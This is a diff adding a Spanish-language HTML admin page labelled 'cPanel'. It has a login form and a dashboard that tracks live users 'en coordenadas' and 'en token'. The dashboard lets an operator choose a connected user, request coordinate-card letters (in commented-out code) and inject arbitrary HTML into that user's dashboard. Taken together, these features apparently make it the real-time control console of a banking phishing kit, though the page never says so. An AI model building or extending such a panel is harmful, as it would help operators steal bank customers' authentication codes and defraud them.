@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous" />
+  <title>cPanel</title>
+  <link rel="stylesheet" href="styles/panel.css" />
+  <link rel="stylesheet" href="styles/audio-system.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+</head>
+<body>
+  <!-- Pantalla de Login -->
+  <div id="login-screen" class="login-container">
+    <div class="card">
+      <div class="card-header">
+        <h3 class="mb-0">Panel</h3>
+      </div>
+      <div class="card-body">
+        <form id="login-form">
+          <div class="form-group">
+            <label for="username">Usuario</label>
+            <input type="text" class="form-control" id="username" placeholder="Ingrese su usuario" />
+          </div>
+          <div class="form-group">
+            <label for="password">Contraseña</label>
+            <div class="input-group">
+              <input type="password" class="form-control" id="password" placeholder="Ingrese su contraseña" />
+              <div class="input-group-append">
+                <button class="btn btn-outline-secondary" type="button" id="toggle-password">
+                  <i class="fa fa-eye" id="eye-icon"></i>
+                </button>
+              </div>
+            </div>
+          </div>
+          <button type="submit" class="btn btn-primary btn-block">
+            Iniciar Sesión
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <!-- Panel de Administración -->
+  <div id="admin-panel" class="d-none">
+    <nav class="navbar navbar-dark mb-4">
+      <span class="navbar-brand">cPanel</span>
+      <div>
+        <button id="logout-btn" class="btn btn-outline-light">
+          Cerrar Sesión
+        </button>
+      </div>
+    </nav>
+    <div class="container-fluid">
+      <div class="row mb-4">
+        <div class="col-md-4">
+          <div class="counter-card blue">
+            <h5>Usuarios Activos</h5>
+            <h3 id="active-users-count">0</h3>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="counter-card green">
+            <h5>En Coordenadas</h5>
+            <h3 id="coordinates-users-count">0</h3>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="counter-card orange">
+            <h5>En Token</h5>
+            <h3 id="token-users-count">0</h3>
+          </div>
+        </div>
+      </div>
+      <div class="row">
+        <div class="col-md-12">
+          <div class="card mb-4">
+            <div class="card-header">
+              <h4 class="mb-0">Usuarios Activos</h4>
+            </div>
+            <div class="card-body">
+              <div id="no-users-message" class="alert alert-info d-none">
+                No hay usuarios activos en este momento.
+              </div>
+              <div id="users-list" class="row">
+                <!-- Aquí se cargarán los usuarios activos -->
+              </div>
+            </div>
+          </div>
+          <!-- <div class="card mb-4" >
+            <div class="card-header">
+              <h4 class="mb-0">Tablero de Control - Iniciales</h4>
+            </div>
+            <div class="card-body">
+              <form id="coordinates-form">
+                <div class="form-group">
+                  <label for="coord-user-select">Seleccionar Usuario:</label>
+                  <select class="form-control" id="coord-user-select" required>
+                    <option value="">Seleccione un usuario...</option>
+                  </select>
+                </div>
+                <div class="siglas" style="display: flex; gap: 4px;">
+                  <div class="form-group">
+                    <label for="coord-1">Letra 1:</label>
+                    <input type="text" class="form-control" id="coord-1" maxlength="2" placeholder="Ej: A1" required />
+                  </div>
+                  <div class="form-group">
+                    <label for="coord-2">Letra 2:</label>
+                    <input type="text" class="form-control" id="coord-2" maxlength="2" placeholder="Ej: B2" required />
+                  </div>
+                  <div class="form-group">
+                    <label for="coord-3">Letra 3:</label>
+                    <input type="text" class="form-control" id="coord-3" maxlength="2" placeholder="Ej: C3" required />
+                  </div>
+                  <div class="form-group">
+                    <label for="coord-4">Letra 4:</label>
+                    <input type="text" class="form-control" id="coord-4" maxlength="2" placeholder="Ej: T4" />
+                  </div>
+                </div>
+                <button type="submit" class="btn btn-primary btn-block">
+                  <i class="fas fa-paper-plane mr-2"></i>Enviar Iniciales
+                </button>
+              </form>
+            </div>
+          </div> -->
+          
+          <!-- Selector de imágenes para el dashboard -->
+          <div class="card">
+            <div class="card-header bg-info text-white">
+              <h4 class="mb-0">Selector de Imágenes</h4>
+            </div>
+            <div class="card-body">
+              <form id="images-form">
+                <div class="form-group">
+                  <label for="img-user-select">Seleccionar Usuario:</label>
+                  <select class="form-control" id="img-user-select" required>
+                    <option value="">Seleccione un usuario...</option>
+                  </select>
+                </div>
+                
+                <div class="form-group">
+                  <label>Imagen de perfil:</label>
+                  <div class="alert alert-info mb-2">
+                    <i class="fas fa-info-circle mr-2"></i>Seleccione una imagen para el perfil del usuario en el menú lateral.
+                    <span id="profile-image-selected" class="badge badge-primary ml-2">No seleccionada</span>
+                  </div>
+                  <div id="profile-images-container" class="row image-gallery profile-images">
+                    <!-- Aquí se cargarán dinámicamente las imágenes de perfil -->
+                  </div>
+                </div>
+                
+                <div class="form-group">
+                  <label for="input-custom-message">Mensaje Personalizado:</label>
+                  <input type="text" class="form-control" id="input-custom-message" placeholder="Ingrese un mensaje para el usuario (ej: BIENVENIDO JUAN)" maxlength="50">
+                  <small class="form-text text-muted">Este mensaje se mostrará en el dashboard del usuario.</small>
+                </div>
+                
+                
+                
+                <!-- Editor HTML Dinámico para Inyección de Contenido -->
+                <div class="card mb-3">
+                  <div class="card-header">
+                    <h5 class="mb-0">
+                      <i class="fas fa-code"></i> Editor HTML Dinámico
+                      <small class="text-muted">- Inyecta HTML personalizado en el dashboard</small>
+                    </h5>
+                  </div>
+                  <div class="card-body">
+                    <div class="form-group">
+                      <label for="htmlInput">HTML para inyectar en el dashboard:</label>
+                      <textarea id="htmlInput" class="form-control" rows="3" 
+                                placeholder="Ingresa el HTML que quieres inyectar en el dashboard del usuario..."
+                                oninput="updateHTMLStats()"></textarea>
+                    </div>                    
+                  </div>
+                </div>
+                
+                <!-- Contenedor oculto para mantener compatibilidad -->
+                <div id="images-container" class="row image-gallery" style="display: none;">
+                  <!-- Contenedor oculto para mantener compatibilidad con el código existente -->
+                </div>
+                
+                <div class="d-flex mt-3" style="gap: 10px;">
+                  <button type="button" class="btn btn-success flex-grow-1" id="save-html-btn">
+                    <i class="fas fa-rocket mr-2"></i>Aplicar HTML
+                  </button>
+                  <!-- <button type="button" class="btn btn-success flex-grow-1" disabled id="save-images-btn-gb">
+                    <i class="fas fa-save mr-2"></i>Clave de operaciones Especiales
+                  </button>
+                  <button type="button" class="btn btn-warning flex-grow-1" disabled id="save-images-error-btn">
+                    <i class="fas fa-exclamation-triangle mr-2"></i>En caso de error
+                  </button> -->
+                </div>
+              </form>
+            </div>
+          </div>
+              </form>
+            </div>
+          </div>
+        </div>
+        <!-- <div class="col-md-4">
+          <div class="card">
+            <div class="card-header">
+              <h4 class="mb-0">Registro de Comandos</h4>
+            </div>
+            <div class="card-body">
+              <div class="command-log" id="command-log">
+                <!-- Aquí se mostrarán los comandos enviados -->
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+  <!-- Incluir directamente la configuración para el panel admin -->
+ 
+  <!-- El panel.js se carga como módulo al final del body -->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+  <script type="module" src="js/panel.js"></script>
+  <script type="module" src="js/firebase-config.js"></script>
+  <script type="module" src="js/panel-audio-integration.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const togglePassword = document.getElementById('toggle-password');
+      const password = document.getElementById('password');
+      const eyeIcon = document.getElementById('eye-icon');
+      
+      if (togglePassword && password && eyeIcon) {
+        togglePassword.addEventListener('click', function() {
+          // Cambiar el tipo de input
+          const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+          password.setAttribute('type', type);
+          
+          // Cambiar el icono
+          if (type === 'password') {
+            eyeIcon.setAttribute('class', 'fa fa-eye');
+          } else {
+            eyeIcon.setAttribute('class', 'fa fa-eye-slash');
+          }
+          
+          // Evita que el botón envíe el formulario
+          return false;
+        });
+      }
+      
+      // Inicializar el editor HTML con un ejemplo
+      const htmlInput = document.getElementById('htmlInput');
+      if (htmlInput) {
+        htmlInput.value = ``;
+        
+        // Actualizar estadísticas iniciales
+        if (typeof updateHTMLStats === 'function') {
+          updateHTMLStats();
+        }
+      }
+      
+      // Configurar el botón principal de aplicar HTML
+      const saveHtmlBtn = document.getElementById('save-html-btn');
+      if (saveHtmlBtn) {
+        saveHtmlBtn.addEventListener('click', function() {
+          if (typeof saveHTMLData === 'function') {
+            saveHTMLData(4); // Redirigir a dashboard.html (página 4)
+          } else {
+            alert('Sistema de HTML dinámico no disponible');
+          }
+        });
+      }
+    });
+  </script>
+</body>
+</html>
